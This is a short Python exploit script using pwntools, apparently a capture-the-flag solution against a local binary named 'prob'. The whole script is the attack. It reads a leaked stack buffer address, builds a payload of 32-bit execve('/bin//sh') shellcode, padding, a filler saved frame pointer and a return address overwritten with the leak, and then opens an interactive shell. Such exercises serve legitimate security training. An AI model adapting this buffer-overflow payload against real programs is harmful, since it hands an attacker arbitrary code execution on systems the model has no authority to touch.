from pwn import*

p = process('./prob')

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

p.recvuntil('buf : ')
leak = int(p.recv(10),16)
print(hex(leak))

payload = shellcode
payload += 'A'*(0x100-len(shellcode))
payload += 'B'*4	#sfp
payload += p32(leak)	#ret

p.sendline(payload)

p.interactive()
